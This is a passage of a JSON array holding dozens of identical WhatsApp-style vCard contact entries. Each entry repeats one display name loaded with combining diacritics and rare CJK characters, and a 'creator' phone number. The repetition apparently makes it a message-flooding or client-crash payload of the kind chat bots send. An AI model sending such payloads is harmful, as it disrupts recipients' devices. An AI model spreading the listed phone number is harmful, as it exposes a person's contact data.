								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{ 
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
								"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Fino;;;\nFN:F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎\nORG:菲諾·朱利安·安加拉\nTITLE:\nitem1.TEL;waid=50587753432:+505 8775-3432\nitem1.X-ABLabel:creator\nEND:VCARD"
							},
							{
								"displayName": "F͓ͥi͓ɳͣxͫ͢9͜9͜9𠐔𠐓𠒎",
